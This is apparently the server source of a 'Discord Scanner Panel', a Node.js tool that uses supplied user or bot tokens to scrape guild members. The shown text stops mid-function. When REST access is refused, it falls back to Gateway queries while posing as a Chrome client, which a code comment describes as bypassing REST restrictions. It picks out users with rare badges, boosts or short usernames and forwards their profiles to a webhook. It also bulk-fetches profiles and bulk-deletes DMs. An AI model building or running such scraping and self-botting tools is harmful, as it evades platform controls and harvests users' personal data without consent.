const express = require('express');
const cors = require('cors');
const axios = require('axios');
const WebSocket = require('ws');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 80;
const DISCORD_API = 'https://discord.com/api/v10';

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use('/badges', express.static('badges'));
const distPath = path.join(__dirname, 'dist');
if (fs.existsSync(distPath)) {
  app.use(express.static(distPath));
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function discordRequest(url, token, params = {}) {
  const headers = { Authorization: token };
  while (true) {
    try {
      const res = await axios.get(`${DISCORD_API}${url}`, { headers, params });
      return res.data;
    } catch (err) {
      if (err.response?.status === 429) {
        const retryAfter = (err.response.data?.retry_after || 1) * 1000;
        console.log(`Rate limited, waiting ${retryAfter}ms...`);
        await sleep(retryAfter + 200);
      } else {
        throw err;
      }
    }
  }
}

// Validate token and get current user info
app.get('/api/me', async (req, res) => {
  const { token } = req.query;
  if (!token) return res.status(400).json({ error: 'Token obrigatório' });

  try {
    const data = await discordRequest('/users/@me', token);
    res.json(data);
  } catch (err) {
    const status = err.response?.status || 500;
    const msg = err.response?.data?.message || 'Token inválido ou erro na API';
    res.status(status).json({ error: msg });
  }
});

// Get guild info
app.get('/api/guilds/:id', async (req, res) => {
  const { token } = req.query;
  const { id } = req.params;
  if (!token) return res.status(400).json({ error: 'Token obrigatório' });

  try {
    const data = await discordRequest(`/guilds/${id}?with_counts=true`, token);
    res.json(data);
  } catch (err) {
    const status = err.response?.status || 500;
    const discordMsg = err.response?.data?.message || '';
    let msg = discordMsg || 'Servidor não encontrado';
    if (status === 403 || discordMsg.toLowerCase().includes('missing access')) {
      msg = 'Missing Access: O token não tem acesso a este servidor. Verifique se o bot está no servidor ou se o usuário faz parte dele.';
    } else if (status === 404) {
      msg = 'Servidor não encontrado. Verifique o ID.';
    } else if (status === 401) {
      msg = 'Token inválido ou expirado.';
    }
    res.status(status).json({ error: msg });
  }
});

// ─── Gateway (WebSocket) member scraper ─────────────────────────
// Technique: recursive op8 queries via WebSocket (bypasses REST restrictions)
// Depth 1: a-z 0-9 _   →  up to 37×100 = 3,700 members
// Depth 2: if a letter returns 100 (truncated), sub-query aa,ab,...,az,a0,...
//          Potentially 37 + 37×37 = 1,406 queries → ~100k+ members for large servers
const GW_CHARS = 'abcdefghijklmnopqrstuvwxyz0123456789_'.split('');

async function scanViaGateway(job, guildId, token, onChunk = null, sharedMemberMap = null, sharedDonePrefixes = null) {
  const GATEWAY = 'wss://gateway.discord.gg/?v=10&encoding=json';
  const isBotToken = token.startsWith('Bot ');

  return new Promise((resolve, reject) => {
    const ws = new WebSocket(GATEWAY, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Origin': 'https://discord.com',
      },
    });

    const memberMap = sharedMemberMap || new Map();
    const donePrefixes = sharedDonePrefixes || new Set();
    let heartbeatInterval = null;
    let seq = null;
    let resolved = false;
    let scanComplete = false;
    let chunkTimer = null;
    let queriesStarted = false;  // prevent double-start
    // Queue of { prefix, depth } to send; pending map nonce→{ prefix, depth, count }
    const queryQueue = [];
    const pendingQueries = new Map();
    const sentPrefixes = new Set(donePrefixes); // skip already-completed prefixes
    let totalQueued = 0;
    let totalDone = 0;

    // Pre-fill queue skipping already-done prefixes
    GW_CHARS.forEach(c => { if (!donePrefixes.has(c)) queryQueue.push({ prefix: c, depth: 1 }); });
    totalQueued = queryQueue.length;

    const finish = (err) => {
      if (resolved) return;
      resolved = true;
      clearInterval(heartbeatInterval);
      clearTimeout(chunkTimer);
      try { ws.terminate(); } catch (_) {}
      const collected = Array.from(memberMap.values());
      if (err && collected.length === 0) reject(err);
      else resolve({ members: collected, complete: scanComplete });
    };

    const resetTimer = (ms = 22000) => {
      clearTimeout(chunkTimer);
      chunkTimer = setTimeout(() => {
        // timeout between chunks — check if more in queue
        if (queryQueue.length > 0 && pendingQueries.size === 0) sendNextQuery();
        else if (pendingQueries.size === 0) finish();
      }, ms);
    };

    const MAX_CONCURRENT = 3;

    const sendNextQuery = () => {
      if (ws.readyState !== WebSocket.OPEN) return;
      // Fill up to MAX_CONCURRENT parallel queries
      while (pendingQueries.size < MAX_CONCURRENT && queryQueue.length > 0) {
        while (queryQueue.length > 0 && sentPrefixes.has(queryQueue[0].prefix)) queryQueue.shift();
        if (queryQueue.length === 0) break;
        const { prefix, depth } = queryQueue.shift();
        if (sentPrefixes.has(prefix)) continue;
        sentPrefixes.add(prefix);
        const nonce = `gw_${prefix}`;
        const pct = Math.round((totalDone / Math.max(totalQueued, 1)) * 100);
        job.progress = `🔤 "${prefix}" (${totalDone}/${totalQueued}, ${pct}%) — ${memberMap.size.toLocaleString()} membros`;
        job.found = memberMap.size;
        console.log('[GW] Sending op8 query:', prefix, 'nonce:', nonce);
        ws.send(JSON.stringify({
          op: 8,
          d: { guild_id: guildId, query: prefix, limit: 100, presences: true, nonce },
        }));
        pendingQueries.set(nonce, { prefix, depth, count: 0 });
      }
      if (queryQueue.length === 0 && pendingQueries.size === 0) { scanComplete = true; finish(); }
      else resetTimer(20000);
    };

    ws.on('open', () => {
      job.progress = '🔌 Conectado ao Gateway Discord...';
    });

    ws.on('message', (raw) => {
      let payload;
      try { payload = JSON.parse(raw.toString()); } catch { return; }
      const { op, d, t, s } = payload;
      if (s != null) seq = s;

      // HELLO → heartbeat + IDENTIFY
      if (op === 10) {
        heartbeatInterval = setInterval(() => {
          if (ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ op: 1, d: seq }));
        }, Math.floor(d.heartbeat_interval * 0.9));

        const identifyPayload = isBotToken ? {
          op: 2,
          d: { token, intents: 513, properties: { os: 'linux', browser: 'disco', device: 'disco' } },
        } : {
          op: 2,
          d: {
            token,
            capabilities: 4093,
            properties: {
              os: 'Windows', browser: 'Chrome', device: '',
              system_locale: 'pt-BR',
              browser_user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
              browser_version: '124.0.0.0', os_version: '10',
              referrer: 'https://discord.com/', referring_domain: 'discord.com',
              referrer_current: '', referring_domain_current: '',
              release_channel: 'stable', client_build_number: 258765,
              client_event_source: null,
            },
            presence: { status: 'online', since: 0, activities: [], afk: false },
            compress: false,
            client_state: {
              guild_versions: {},
              highest_last_message_id: '0',
              read_state_version: 0,
              user_guild_settings_version: -1,
              user_settings_version: -1,
              private_channels_version: '0',
              api_code_version: 0,
            },
          },
        };
        ws.send(JSON.stringify(identifyPayload));
      }

      if (op === 9) finish(new Error('Sessão inválida — token incorreto ou expirado.'));

      if (op === 0) {

        // Helper: subscribe via op14 with a real channel, then start op8 queries
        const beginScan = (channelId) => {
          if (queriesStarted) return;
          queriesStarted = true;
          const channels = channelId ? { [channelId]: [[0, 99]] } : {};
          console.log('[GW] beginScan with channelId:', channelId || '(none)');
          ws.send(JSON.stringify({
            op: 14,
            d: { guild_id: guildId, typing: true, threads: false, activities: true,
                 members: [], channels, thread_member_lists: [] },
          }));
          job.progress = '📡 Sincronizando lista de membros...';
          // Wait for GUILD_MEMBER_LIST_UPDATE before starting op8
          // Fallback: start after 3s anyway
          setTimeout(sendNextQuery, 3000);
        };

        if (t === 'READY') {
          console.log('[GW] READY received, isBotToken:', isBotToken, 'guildId:', guildId);
          job.progress = '✅ Autenticado. Aguardando GUILD_CREATE...';
          if (isBotToken) {
            ws.send(JSON.stringify({
              op: 8,
              d: { guild_id: guildId, query: '', limit: 0, presences: false, nonce: 'bot_all' },
            }));
            resetTimer(60000);
          } else {
            const readyGuilds = d.guilds || [];
            const guildEntry = readyGuilds.find(g => g.id === guildId);
            if (guildEntry && !guildEntry.unavailable) {
              console.log('[GW] Guild available in READY (small guild)');
              setTimeout(() => beginScan(null), 500);
            } else {
              console.log('[GW] Large guild — waiting for GUILD_CREATE...');
              // Fallback: if GUILD_CREATE doesn't arrive in 15s, try anyway
              setTimeout(() => { if (!queriesStarted) { console.log('[GW] Fallback: no GUILD_CREATE'); beginScan(null); } }, 15000);
            }
          }
        }

        // GUILD_CREATE fires when large guild becomes available — contains channel list
        if (t === 'GUILD_CREATE' && d.id === guildId) {
          const textCh = (d.channels || []).find(c => c.type === 0); // type 0 = text channel
          console.log('[GW] GUILD_CREATE received, first text channel:', textCh?.id || 'none');
          setTimeout(() => beginScan(textCh?.id || null), 500);
        }

        // Once GUILD_MEMBER_LIST_UPDATE arrives, member list is synced — start queries now
        if (t === 'GUILD_MEMBER_LIST_UPDATE' && d.guild_id === guildId && queriesStarted) {
          for (const op of (d.ops || []))
            for (const item of (op.items || []))
              if (item.member?.user?.id) memberMap.set(item.member.user.id, item.member);
          job.found = memberMap.size;
        }

        // log key events for debugging
        if (t && !['SESSIONS_REPLACE','PRESENCE_UPDATE','MESSAGE_CREATE','TYPING_START'].includes(t)) {
          console.log('[GW] EVENT:', t, d?.id || d?.guild_id || '');
        }

        // op8 response chunks
        if (t === 'GUILD_MEMBERS_CHUNK' && d.guild_id === guildId) {
          console.log('[GW] CHUNK nonce:', d.nonce, 'members:', d.members?.length, 'chunk:', d.chunk_index, '/', d.chunk_count);
          const chunkMembers = d.members || [];
          const chunkPresences = d.presences || [];
          const presenceByUser = {};
          for (const p of chunkPresences) if (p.user?.id) presenceByUser[p.user.id] = p;
          for (const m of chunkMembers) {
            if (!m.user?.id) continue;
            if (presenceByUser[m.user.id]) m.presence = presenceByUser[m.user.id];
            memberMap.set(m.user.id, m);
          }
          if (onChunk && chunkMembers.length > 0) onChunk(chunkMembers);
          job.found = memberMap.size;

          const nonce = d.nonce || '';
          const isLast = d.chunk_index === d.chunk_count - 1;

          if (nonce === 'bot_all') {
            job.progress = `📦 Chunk ${d.chunk_index + 1}/${d.chunk_count} — ${memberMap.size.toLocaleString()} membros`;
            resetTimer(30000);
            if (isLast) finish();
          } else if (nonce.startsWith('gw_')) {
            const meta = pendingQueries.get(nonce);
            if (meta) meta.count += (d.members || []).length;
            if (isLast) {
              const count = meta?.count ?? (d.members || []).length;
              const { prefix, depth } = meta || {};
              pendingQueries.delete(nonce);
              if (prefix) donePrefixes.add(prefix);
              totalDone++;

              // If this prefix returned a full page (100) AND depth < 3,
              // queue sub-queries to capture truncated results
              if (count === 100 && depth < 3) {
                GW_CHARS.forEach(c => {
                  const sub = prefix + c;
                  if (!sentPrefixes.has(sub)) {
                    queryQueue.push({ prefix: sub, depth: depth + 1 });
                    totalQueued++;
                  }
                });
              }
              setTimeout(sendNextQuery, 40);
            }
          }
        }

      }
    });

    ws.on('error', (err) => finish(new Error('WebSocket erro: ' + err.message)));
    ws.on('close', (code, reason) => {
      console.log(`[GW] Conexão fechada: código ${code} — prefixos prontos: ${donePrefixes.size}, membros: ${memberMap.size}`);
      if (!resolved) finish(new Error(`Gateway fechou (código ${code})`));
    });

    // Hard cap: 15 minutes
    setTimeout(() => { if (!resolved) { job.progress += ' (tempo máximo atingido)'; finish(); } }, 900000);
  });
}

// ─── Async scan job ───────────────────────────────────────────────
const scanJobs = new Map();

// Search chars: a-z 0-9 and common prefixes to maximise member coverage
const SEARCH_CHARS = 'abcdefghijklmnopqrstuvwxyz0123456789_.-'.split('');

async function runScanJob(job, id, token) {
  // ── Webhook streaming for rare badge holders ──────────────────
  const webhookUrl = job.webhookUrl || null;
  const rareQueue = [];
  const sentToWebhook = new Set(); // dedup: track IDs already enqueued
  let rareSending = false;

  const jobFlagMask = job.flagMask || 0;
  const jobBooster = job.boosterSelected || false;
  const jobBoostLevels = job.boostLevels || null;
  const jobRpcFilter = (job.rpcFilter || '').toLowerCase().trim();

  const enqueueRare = (members) => {
    if (!webhookUrl) return;
    for (const m of members) {
      const uid = m.user?.id;
      if (!uid || sentToWebhook.has(uid)) continue;
      const flags = m.user?.public_flags || 0;
      const matchesFlag = jobFlagMask ? (flags & jobFlagMask) !== 0 : flags > 0;
      let matchesBooster = false;
      if (jobBooster && m.premium_since) {
        const ts = new Date(m.premium_since).getTime();
        if (!isNaN(ts)) {
          const months = Math.floor((Date.now() - ts) / (1000 * 60 * 60 * 24 * 30.44));
          if (jobBoostLevels) {
            if (jobBoostLevels.boost1 && months >= 0 && months <= 5) matchesBooster = true;
            if (jobBoostLevels.boost2 && months >= 6 && months <= 14) matchesBooster = true;
            if (jobBoostLevels.boost3 && months >= 15) matchesBooster = true;
          } else {
            matchesBooster = true;
          }
        }
      }
      let matchesRpc = false;
      if (jobRpcFilter) {
        const acts = m.presence?.activities || [];
        matchesRpc = acts.some(a => (a.name || '').toLowerCase().includes(jobRpcFilter));
      }
      if (matchesFlag || matchesBooster || matchesRpc) {
        sentToWebhook.add(uid);
        rareQueue.push(m);
      }
    }
  };

  const flushRareQueue = async () => {
    if (rareSending || rareQueue.length === 0 || !webhookUrl) return;
    rareSending = true;
    const batch = rareQueue.splice(0, 5);
    try {
      for (let i = 0; i < batch.length; i++) {
        const m = batch[i];
        const embed = buildEmbed(m, (job.rareSent || 0) + i + 1);
        await sendWebhookEmbed(webhookUrl, embed);
        await sleep(1100);
      }
      job.rareSent = (job.rareSent || 0) + batch.length;
    } catch { /* ignore webhook errors during scan */ }
    rareSending = false;
  };

  const rareInterval = webhookUrl ? setInterval(flushRareQueue, 2100) : null;
  // ── Phase 1: try paginated REST ────────────────────────────────
  try {
    job.mode = 'paginated';
    job.progress = 'Carregando membros (modo paginado)...';
    let allMembers = [];
    let after = '0';
    let page = 0;

    while (page < 200) { // up to 200 000 members
      const params = { limit: 1000 };
      if (after !== '0') params.after = after;

      let chunk;
      // retry loop for 429 inside paginated scan
      while (true) {
        try {
          chunk = await discordRequest(`/guilds/${id}/members`, token, params);
          break;
        } catch (e) {
          if (e.response?.status === 429) {
            const wait = (e.response.data?.retry_after || 1) * 1000 + 500;
            job.progress = `⏳ Rate limit — aguardando ${(wait/1000).toFixed(1)}s...`;
            await sleep(wait);
          } else throw e;
        }
      }

      if (!chunk || chunk.length === 0) break;
      allMembers = allMembers.concat(chunk);
      job.found = allMembers.length;
      job.progress = `Paginado: ${allMembers.length} membros...`;
      page++;
      if (chunk.length < 1000) break;
      after = chunk[chunk.length - 1].user.id;
      await sleep(350);
    }

    job.members = allMembers;
    job.found = allMembers.length;
    job.status = 'done';
    job.done = true;
    job.progress = `✅ ${allMembers.length} membros carregados (modo paginado).`;
    return;
  } catch (err) {
    if (err.response?.status !== 403) throw err;
    job.progress = '⚠️ REST bloqueado (403). Tentando via Gateway WebSocket...';
    await sleep(500);
  }

  // ── Phase 2: Gateway WebSocket — persiste estado entre reconexões ──────
  const gwMemberMap = new Map();
  const gwDonePrefixes = new Set();
  const MAX_GW_RETRIES = 6;
  for (let attempt = 1; attempt <= MAX_GW_RETRIES; attempt++) {
    try {
      job.mode = 'gateway';
      job.progress = attempt === 1
        ? '🔌 Conectando ao Gateway...'
        : `🔄 Reconectando (${attempt}/${MAX_GW_RETRIES}) — ${gwMemberMap.size.toLocaleString()} membros coletados...`;
      const result = await scanViaGateway(job, id, token, enqueueRare, gwMemberMap, gwDonePrefixes);
      job.found = gwMemberMap.size;
      if (result.complete) break;
      if (gwMemberMap.size === 0 && attempt >= 3) break;
      if (attempt < MAX_GW_RETRIES) { await sleep(3000); continue; }
    } catch (err) {
      job.progress = `⚠️ Gateway erro (${attempt}/${MAX_GW_RETRIES}): ${err.message}`;
      if (gwMemberMap.size > 0) break;
      if (attempt < MAX_GW_RETRIES) await sleep(3000);
    }
  }
  if (gwMemberMap.size > 0) {
    const gwMembers = Array.from(gwMemberMap.values());
    job.members = gwMembers;
    job.found = gwMembers.length;
    if (rareInterval) clearInterval(rareInterval);
    await flushRareQueue();
    job.status = 'done';
    job.done = true;
    const rareSuffix = job.rareSent ? ` · ${job.rareSent} raras enviadas` : '';
    job.progress = `✅ ${gwMembers.length.toLocaleString()} membros encontrados${rareSuffix}.`;
    return;
  }
  if (rareInterval) clearInterval(rareInterval);
  job.progress = '⚠️ Gateway retornou 0. Tentando busca por letras...';

  // ── Phase 3: search-by-letter fallback ───────────────────────
  job.mode = 'search';
  const memberMap = new Map();

  for (let i = 0; i < SEARCH_CHARS.length; i++) {
    const ch = SEARCH_CHARS[i];
    job.progress = `🔍 Letra "${ch}" (${i + 1}/${SEARCH_CHARS.length}) — ${memberMap.size} membros únicos encontrados`;
    job.found = memberMap.size;

    let retries = 0;
    let abortSearch = false;
    while (retries < 2) {
      try {
        const results = await discordRequest(`/guilds/${id}/members/search`, token, { query: ch, limit: 1000 });
        if (results?.length === 0) console.log(`[Search] Letra "${ch}" retornou 0 membros`);
        if (ch === SEARCH_CHARS[0]) console.log(`[Search] Letra "${ch}" retornou ${results?.length ?? 0} membros`);
        (results || []).forEach(m => { if (m.user?.id) memberMap.set(m.user.id, m); });
        enqueueRare(results || []);
        break;
      } catch (e) {
        if (e.response?.status === 429) {
          const wait = Math.min((e.response.data?.retry_after || 2) * 1000 + 500, 10000);
          job.progress = `⏳ Rate limit "${ch}" — aguardando ${(wait/1000).toFixed(1)}s...`;
          await sleep(wait);
          retries++;
        } else if (e.response?.status === 403) {
          console.error(`[Search] 403 na letra "${ch}":`, e.response?.data);
          job.status = 'error';
          job.done = true;
          job.progress = '❌ Token sem acesso ao servidor. Certifique-se de que a conta está no servidor antes de escanear.';
          abortSearch = true;
          break;
        } else {
          console.error(`[Search] Erro ${e.response?.status} na letra "${ch}":`, e.response?.data);
          job.errors++;
          break;
        }
      }
    }
    if (abortSearch) return;

    await sleep(700); // ~80 req/min — safe under Discord's ~120/min limit
  }

  job.members = Array.from(memberMap.values());
  job.found = job.members.length;
  job.status = 'done';
  job.done = true;
  const rareSuffix = job.rareSent ? ` · ${job.rareSent} raras enviadas` : '';
  job.progress = `✅ Busca concluída: ${job.members.length} membros únicos (modo letras)${rareSuffix}.`;
}

app.post('/api/guilds/:id/scan/start', async (req, res) => {
  const { token, webhookUrl, flagMask, boosterSelected, boostLevels, rpcFilter } = req.body;
  const { id } = req.params;
  if (!token) return res.status(400).json({ error: 'Token obrigatório' });

  // Fetch guild info first (fast, synchronous)
  let guildData = null;
  try {
    guildData = await discordRequest(`/guilds/${id}?with_counts=true`, token);
  } catch (e) {
    const status = e.response?.status || 500;
    let msg = e.response?.data?.message || 'Erro ao buscar servidor';
    if (status === 403) msg = 'Sem acesso ao servidor. Verifique se você é membro.';
    if (status === 404) msg = 'Servidor não encontrado. Verifique o ID.';
    if (status === 401) msg = 'Token inválido ou expirado.';
    return res.status(status).json({ error: msg });
  }

  const jobId = `scan-${Date.now()}-${Math.random().toString(36).slice(2)}`;
  const job = { status: 'running', mode: 'paginated', done: false, found: 0, rareSent: 0, progress: 'Iniciando...', members: [], errors: 0, guildData, webhookUrl: webhookUrl || null, flagMask: flagMask || 0, boosterSelected: !!boosterSelected, boostLevels: boostLevels || null, rpcFilter: (rpcFilter || '').toLowerCase().trim() };
  scanJobs.set(jobId, job);

  runScanJob(job, id, token).catch(e => {
    job.status = 'error';
    job.done = true;
    job.progress = `❌ ${e.response?.data?.message || e.message}`;
  });

  res.json({ jobId, guildData });
});

app.get('/api/scan/status/:jobId', (req, res) => {
  const job = scanJobs.get(req.params.jobId);
  if (!job) return res.status(404).json({ error: 'Job não encontrado' });
  const { members, ...rest } = job; // exclude heavy members array from status
  res.json(rest);
});

app.get('/api/scan/result/:jobId', (req, res) => {
  const job = scanJobs.get(req.params.jobId);
  if (!job) return res.status(404).json({ error: 'Job não encontrado' });
  if (!job.done) return res.status(202).json({ error: 'Scan ainda em andamento' });
  res.json({ members: job.members, total: job.members.length, guildData: job.guildData });
});

// ─── Webhook sender ──────────────────────────────────────────────

// Possible emoji names per badge flag (lowercase, checked in order)
const BADGE_EMOJI_NAMES = {
  [1 << 0]:  ['discordstuffbadge', 'discordstaff', 'staff'],
  [1 << 1]:  ['partnerserverowner', 'partner', 'partnered'],
  [1 << 2]:  ['hypesquadevents', 'hypesquad_events'],
  [1 << 3]:  ['buglv1', 'bughunter', 'bug_hunter'],
  [1 << 6]:  ['hypesquadbravery', 'bravery'],
  [1 << 7]:  ['hypesquadbrilliance', 'brilliance'],
  [1 << 8]:  ['hypesquadbalance', 'balance'],
  [1 << 9]:  ['earlysupporter', 'early_supporter'],
  [1 << 14]: ['goldbughunter', 'gold_bug_hunter'],
  [1 << 17]: ['earlyverifiedbot', 'earlyverifiedbotdeveloper', 'early_verified_bot'],
  [1 << 18]: ['discordmoderatorprogramalumnibad', 'certifiedmoderator', 'moderator_alumni'],
  [1 << 22]: ['activedev', 'activedeveloper', 'active_developer'],
  'booster': ['server_booster_24_months', '6077boostlevel8', 'serverbooster', 'booster'],
};

function resolveEmoji(key, emojiMap) {
  const names = BADGE_EMOJI_NAMES[key] || [];
  for (const name of names) {
    const e = emojiMap[name.toLowerCase()];
    if (e) return e.animated ? `<a:${e.name}:${e.id}>` : `<:${e.name}:${e.id}>`;
  }
  return null;
}

const BADGE_FLAGS = [
  { flag: 1 << 0,  emoji: '⚙️',  name: 'Discord Staff',        rare: true  },
  { flag: 1 << 1,  emoji: '🤝',  name: 'Partner',              rare: true  },
  { flag: 1 << 2,  emoji: '🎉',  name: 'HypeSquad Events',     rare: true  },
  { flag: 1 << 3,  emoji: '🐛',  name: 'Bug Hunter',           rare: true  },
  { flag: 1 << 6,  emoji: '🏠',  name: 'HypeSquad Bravery',    rare: false },
  { flag: 1 << 7,  emoji: '🏠',  name: 'HypeSquad Brilliance', rare: false },
  { flag: 1 << 8,  emoji: '🏠',  name: 'HypeSquad Balance',    rare: false },
  { flag: 1 << 9,  emoji: '💜',  name: 'Early Supporter',      rare: true  },
  { flag: 1 << 14, emoji: '🏅',  name: 'Gold Bug Hunter',      rare: true  },
  { flag: 1 << 17, emoji: '🤖',  name: 'Early Bot Developer',  rare: true  },
  { flag: 1 << 18, emoji: '🛡️',  name: 'Certified Moderator',  rare: true  },
  { flag: 1 << 22, emoji: '💻',  name: 'Active Developer',     rare: false },
];

function getAvatarUrl(user) {
  if (!user?.avatar) {
    const idx = Number(BigInt(user.id) >> 22n) % 6;
    return `https://cdn.discordapp.com/embed/avatars/${idx}.png`;
  }
  const ext = user.avatar.startsWith('a_') ? 'gif' : 'png';
  return `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${ext}?size=256`;
}

const NITRO_LABELS = { 1: '💎 Nitro Classic', 2: '🚀 Nitro', 3: '✨ Nitro Basic' };

function buildEmbed(member, rank, emojiMap = {}) {
  const u = member.user || {};
  const flags = u.public_flags || 0;
  const isBooster = !!member.premium_since;
  const nitroLabel = NITRO_LABELS[u.premium_type] || null;

  const foundBadges = BADGE_FLAGS.filter((b) => (flags & b.flag) !== 0);
  const rareCount = foundBadges.filter((b) => b.rare).length;
  const totalBadges = foundBadges.length + (isBooster ? 1 : 0) + (nitroLabel ? 1 : 0);

  // Embed color: gold for rare badges, pink for booster, blurple default
  let color = 0x5865F2;
  if (rareCount > 0) color = 0xFFD700;
  else if (isBooster) color = 0xF47FFF;

  const badgeLines = foundBadges.map((b) => {
    const custom = resolveEmoji(b.flag, emojiMap);
    return `${custom || b.emoji} ${b.name}`;
  });
  if (nitroLabel) badgeLines.push(nitroLabel);
  if (isBooster) {
    const boostTs = new Date(member.premium_since).getTime();
    const months = isNaN(boostTs) ? null : Math.floor((Date.now() - boostTs) / (1000 * 60 * 60 * 24 * 30.44));
    const tier = months === null ? '' : months >= 15 ? ' • Tier 3' : months >= 6 ? ' • Tier 2' : ' • Tier 1';
    const monthsStr = months !== null ? ` (${months}m)` : '';
    const boostEmoji = resolveEmoji('booster', emojiMap);
    badgeLines.push(`${boostEmoji || '💠'} Booster${monthsStr}${tier}`);
  }
  const badgeValue = badgeLines.length > 0 ? badgeLines.join('\n') : '*(sem badges)*';

  const displayName = u.global_name || u.username || 'Unknown';
  const uname = u.username || '';
  const unameDisplay = uname.length >= 2 && uname.length <= 3
    ? `\`${uname}\` ⭐ **${uname.length} chars**`
    : uname || 'N/A';

  const joinedAt = member.joined_at
    ? `<t:${Math.floor(new Date(member.joined_at).getTime() / 1000)}:f>`
    : '???';

  const fields = [
    {
      name: '🆔 ID',
      value: `\`${u.id}\` | <@${u.id}>`,
      inline: false,
    },
    {
      name: '👤 Username',
      value: unameDisplay,
      inline: true,
    },
    {
      name: '✨ Global Name',
      value: u.global_name || u.username || 'N/A',
      inline: true,
    },
    {
      name: `💎 Badges: ${totalBadges} (${rareCount} rare)`,
      value: badgeValue,
      inline: false,
    },
    {
      name: '📅 Entrou no servidor',
      value: joinedAt,
      inline: true,
    },
  ];

  if (isBooster && member.premium_since) {
    const boostTs = Math.floor(new Date(member.premium_since).getTime() / 1000);
    if (!isNaN(boostTs)) {
      fields.push({
        name: '💠 Boosting desde',
        value: `<t:${boostTs}:f>`,
        inline: true,
      });
    }
  }

  return {
    title: `👑 Rank #${rank} · ${displayName}`,
    color,
    thumbnail: { url: getAvatarUrl(u) },
    fields,
    footer: { text: 'Discord Scanner Panel' },
  };
}

async function sendWebhookEmbed(webhookUrl, embed) {
  const payload = {
    embeds: [embed],
  };

  while (true) {
    try {
      const res = await axios.post(webhookUrl, payload, {
        headers: { 'Content-Type': 'application/json' },
      });
      return res;
    } catch (err) {
      if (err.response?.status === 429) {
        const retryAfter = (err.response.data?.retry_after || 1) * 1000;
        console.log(`Webhook rate limited, waiting ${retryAfter}ms...`);
        await sleep(retryAfter + 150);
      } else {
        throw err;
      }
    }
  }
}

const webhookJobs = new Map();

app.post('/api/webhook/start', (req, res) => {
  const { webhookUrl, members, onlyWithBadges, guildId, token } = req.body;
  if (!webhookUrl || !members) return res.status(400).json({ error: 'webhookUrl e members obrigatórios' });

  const jobId = `${Date.now()}-${Math.random().toString(36).slice(2)}`;

  const job = {
    status: 'running',
    sent: 0,
    total: 0,
    errors: 0,
    done: false,
    startedAt: Date.now(),
  };
  webhookJobs.set(jobId, job);

  (async () => {
    try {
      // Fetch guild emojis to use custom badge emojis
      let emojiMap = {};
      if (guildId && token) {
        try {
          const emojis = await discordRequest(`/guilds/${guildId}/emojis`, token);
          emojis.forEach((e) => { emojiMap[e.name.toLowerCase()] = e; });
          console.log(`Loaded ${emojis.length} custom emojis from guild ${guildId}`);
        } catch (e) {
          console.warn('Could not fetch guild emojis:', e.message);
        }
      }

      const filtered = onlyWithBadges
        ? members.filter((m) => (m.user?.public_flags || 0) > 0 || m.premium_since)
        : members;

      job.total = filtered.length;

      for (let i = 0; i < filtered.length; i++) {
        const embed = buildEmbed(filtered[i], i + 1, emojiMap);
        try {
          await sendWebhookEmbed(webhookUrl, embed);
          job.sent++;
        } catch (e) {
          job.errors++;
          console.error(`Embed send error [${i}]:`, e.message);
        }
        // ~27 msgs/min to stay safely under the 30/min limit
        await sleep(2200);
      }

      job.status = 'done';
      job.done = true;
    } catch (e) {
      job.status = 'error';
      job.done = true;
      job.errorMsg = e.message;
    }
  })();

  res.json({ jobId });
});

app.get('/api/webhook/status/:jobId', (req, res) => {
  const job = webhookJobs.get(req.params.jobId);
  if (!job) return res.status(404).json({ error: 'Job não encontrado' });
  res.json(job);
});

// ─── Deep Scan (fetch premium_type per user) ───────────────────
const deepScanJobs = new Map();

app.post('/api/deepscan/start', (req, res) => {
  const { userIds, token } = req.body;
  if (!userIds || !token) return res.status(400).json({ error: 'userIds e token obrigatórios' });

  const jobId = `ds-${Date.now()}-${Math.random().toString(36).slice(2)}`;
  const job = { status: 'running', done: false, fetched: 0, total: userIds.length, data: {}, errors: 0 };
  deepScanJobs.set(jobId, job);

  (async () => {
    const BATCH = 15;
    for (let i = 0; i < userIds.length; i += BATCH) {
      const chunk = userIds.slice(i, i + BATCH);
      await Promise.all(chunk.map(async (uid) => {
        try {
          const profile = await discordRequest(`/users/${uid}/profile`, token);
          job.data[uid] = profile.premium_type ?? 0;
        } catch {
          job.data[uid] = null;
          job.errors++;
        }
        job.fetched++;
      }));
      await sleep(200); // 15 req per 200ms ≈ 75 req/s
    }
    job.status = 'done';
    job.done = true;
  })();

  res.json({ jobId });
});

app.get('/api/deepscan/status/:jobId', (req, res) => {
  const job = deepScanJobs.get(req.params.jobId);
  if (!job) return res.status(404).json({ error: 'Job não encontrado' });
  res.json(job);
});

// ─── User profile ──────────────────────────────────────────────
// Fetch user profile (requires user token, not bot token)
app.get('/api/users/:id/profile', async (req, res) => {
  const { token } = req.query;
  const { id } = req.params;
  if (!token) return res.status(400).json({ error: 'Token obrigatório' });

  try {
    const data = await discordRequest(`/users/${id}/profile`, token);
    res.json(data);
  } catch (err) {
    const status = err.response?.status || 500;
    const msg = err.response?.data?.message || 'Erro ao buscar perfil';
    res.status(status).json({ error: msg });
  }
});

// ─── CL Panel ─────────────────────────────────────────────────
const clJobs = new Map();

async function clJobRunner(jobId, token, fn) {
  const job = clJobs.get(jobId);
  try { await fn(job); job.status = 'done'; job.done = true; }
  catch (e) { job.status = 'error'; job.done = true; job.progress = `❌ ${e.response?.data?.message || e.message}`; }
}

app.post('/api/cl/close-dms', (req, res) => {
  const { token } = req.body;
  if (!token) return res.status(400).json({ error: 'Token obrigatório' });
  const jobId = `cl-${Date.now()}`;
  clJobs.set(jobId, { status: 'running', done: false, progress: 'Buscando DMs...', closed: 0, total: 0 });
  res.json({ jobId });
  clJobRunner(jobId, token, async (job) => {
    const channels = await discordRequest('/users/@me/channels', token);
    const dms = (channels || []).filter(c => c.type === 1 || c.type === 3);
    job.total = dms.length;
    for (const ch of dms) {
      try { await axios.delete(`${DISCORD_API}/channels/${ch.id}`, { headers: { Authorization: token } }); job.closed++; } catch {}
      job.progress = `Fechando DMs... ${job.closed}/${job.total}`;
      await sleep(400);
